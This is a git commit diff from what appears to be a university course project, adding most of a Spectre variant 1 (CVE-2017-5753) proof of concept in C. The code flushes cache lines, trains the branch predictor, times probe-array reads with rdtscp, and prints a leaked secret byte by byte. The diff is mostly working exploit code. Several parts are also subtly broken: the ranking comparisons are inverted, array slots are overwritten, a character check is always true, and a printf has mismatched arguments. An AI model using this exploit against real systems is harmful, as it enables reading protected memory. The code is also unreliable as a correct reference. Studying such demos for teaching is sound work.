3adc9b55231c4de8faed04aa14421d205f3e3620
Matthew Gilpin <matty0005@gmail.com>
2023-03-12 16:57:09 +1000

    More code written

--- main.c
+++ main.c
@@ -15,7 +15,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <x86intrin.h>
+#include <string.h>
 
+#define CACHE_HIT_THRESHOLD 80
 
 /**
  * @brief Victim code goes here
@@ -44,6 +46,9 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
 
     static int results[256];
     size_t train_x, x;
+    int i_mixed, junk = 0, j, k;
+    volatile uint8_t *addr;
+    register uint64_t time1, time2;
     
     for (int i = 0; i < 256; i++)
         results[i] = 0;
@@ -55,6 +60,7 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
             _mm_clflush(&array2[i*512]);
 
         // Train the BTB 
+        train_x = tries * array1_size;
         for (int i = 29; i >= 0; i--) {
             
             _mm_clflush(&array1_size);
@@ -72,10 +78,57 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
             // Victim function
             victim_function(x);
         }   
+
+        // Mix up order to prevent stride predicition
+        for (int i = 0; i < 256; i++) {
+
+            i_mixed = ((i * 167) + 13) & 255;
+            addr = &array2[i_mixed * 512];
+
+            // Calculate time needed to fetch address - may be in 
+            // cache or in main memory.
+            time1 = __rdtscp(&junk);
+            junk = *addr;
+            time2 = __rdtscp(&junk) - time1;
+
+            // Check if cache hit, if so, increment score by one
+            if (time2 <= CACHE_HIT_THRESHOLD && i_mixed != array1[tries  % array1_size]) {
+                results[i_mixed]++;
+            }
+        }
+
+        // Find the first and second highest results
+        j =-1;
+        k =-1;
+
+        for (int i = 0; i < 256; i++) {
+            
+            if (j < 0 || results[i] < results[j]){
+                k = j;
+                j = i;
+            } else if (k < 0 || results[i] < results[k]) {
+                k = i;
+            }
+        }
+
+        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+            break;
     }
+    results[0] ^= junk;
+    value[0] = (uint8_t) j;
+    score[0] = results[j];
+    value[0] = (uint8_t) k;
+    score[0] = results[k];
 
 }
 
+
+char getChar(uint8_t value) {
+    if (value > 31 || value < 127)
+        return (char)value;
+    
+    return '?';
+}
 
 /**
  * @brief Main program
@@ -84,6 +137,28 @@ void readMemory(size_t target_index, uint8_t value[2], int score[2]) {
 int main() {
     printf("-- Spectre Demo for COMS4507 Semester 1 2023 --\n");
     printf("-- CVE2017-5753 --\n");
+
+    size_t target_x = (size_t) (secret - (char *) array1);
+
+    uint8_t value[2];
+    int score[2];
+    int len = strlen(secret);
+
+    for (int i = 0; i < sizeof(array2); i++)
+        array2[i] = 1;
+
+    while (--len >= 0) {
+        printf("Reading at target_x = %p\n", (void *)target_x);
+        readMemory(target_x++, value, score);
+
+        printf("%s: ", (score[0] > (2 * score[1])) ? "Sucess":"Invalid");
+        printf("0x%02X='%c' score=%d  ", value[0], getChar(value[0]), score[0]);
+
+        if (score[1] > 0)
+            printf("(second best: 0x%02X='%c' score=%d)", value[1], score[1]);
+        
+        printf("\n");
+    }
 
     victim_function(2);
 
